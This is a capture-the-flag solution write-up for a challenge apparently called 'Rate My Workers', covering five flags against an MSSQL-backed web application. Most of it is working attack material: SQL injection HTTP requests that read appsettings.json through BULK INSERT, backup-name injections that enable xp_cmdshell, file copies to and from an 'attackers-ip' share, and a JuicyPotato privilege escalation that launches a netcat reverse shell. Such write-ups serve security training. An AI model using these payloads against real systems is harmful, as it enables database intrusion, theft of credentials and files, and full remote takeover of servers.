# Rate My Workers (Blackmail)

Solutions

## Flag 1

The player will receive a zip file named flagdb.zip that contains two files (flagdb.mdf and flagdb_log.ldf). Restore them with a locally installed MSSQL instance and decrypt the flag using the following:

DECLARE @object VARBINARY(max), @output NVARCHAR(max)
SELECT @object = [flag] FROM [dbo].[flag] ORDER BY [flag] OFFSET 0 ROW FETCH FIRST 1 ROW ONLY
EXEC dbo.decrypt @object, @output = @output OUTPUT
SELECT @output
GO

## Flag 2

The player will receive two new zip files named worker_1c3a6a4dc9b308df.zip and ratemyworkers_176f9b5f22910215.zip that contains the MDF/LDF file of a web application and the other contains the compiled web application code.

DECLARE @password VARBINARY(max), @output NVARCHAR(max), @name VARCHAR(11)
SELECT @name = [name], @password = [password] FROM [dbo].[evaluators] WHERE password_last_modified like '2023-04%' ORDER BY [id] OFFSET 0 ROW FETCH FIRST 1 ROW ONLY
EXEC dbo.decrypt @password, @output = @output OUTPUT
SELECT @name, @output
GO

## Flag 3

Steal the appsettings.json.

```
POST /Ratings HTTP/1.1
Host: localhost:2473
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json
Content-Length: 194

[{"table":"workers","name":"name","value":",');BULK INSERT worker.dbo.workers FROM 'C:\\inetpub\\wwwroot\\appsettings.json' WITH (ERRORFILE = '\\\\shell.ctf\\share\\a');SELECT * FROM evaluations AS e--"}]
```

## Flag 4

Using the credentials obtained in the previous step, use the create database backup functionality to enable xp_cmdshell using the SQL injection.

```
POST /CreateBackup HTTP/1.1
Host: localhost:2473
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 487
Connection: close

Input.Server=WIN-DRNAADLUHFV\SQLEXPRESS&Input.Username=devadmin&Input.Password=FLAG-715c5c1a8fbeeeb20179507a9fde2181&Input.Database=worker]+TO+DISK+=+'C:\temp\backup.bak';EXECUTE+sp_configure+'show+advanced+option','1'%3bRECONFIGURE%3bEXECUTE+sp_configure+'xp_cmdshell','1'%3bRECONFIGURE--
```

### Payload 1

```
worker] TO DISK = 'C:\temp\backup.bak';EXECUTE sp_configure 'show advanced option','1';RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell','1';RECONFIGURE--
```

### Payload 2

```
worker] TO DISK = 'C:\temp\backup.bak';EXECUTE xp_copy_file 'C:\\flag_rce_FsXxVwRy93.txt','\\attackers-ip\share\flag_rce.txt'--
```

## Flag 5

Get SYSTEM by using the SEImpersonatePrivileges.

### Payload 1

```
worker] TO DISK = 'C:\temp\backup.bak';EXECUTE xp_copy_file '\\attackers-ip\share\nc.exe','c:\temp\nc.exe'--
```

### Payload 2

```
worker] TO DISK = 'C:\temp\backup.bak';EXECUTE xp_copy_file '\\attackers-ip\share\juicypotato.exe','c:\temp\juicypotato.exe'--
```

### Payload 3

```
worker] TO DISK = 'C:\temp\backup.bak';EXECUTE xp_cmdshell 'c:\temp\juicypotato.exe -t * -l 4445 -p "cmd.exe" -a "/c ""C:\temp\nc64.exe -e cmd.exe attackers-ip 4445"""'--
```
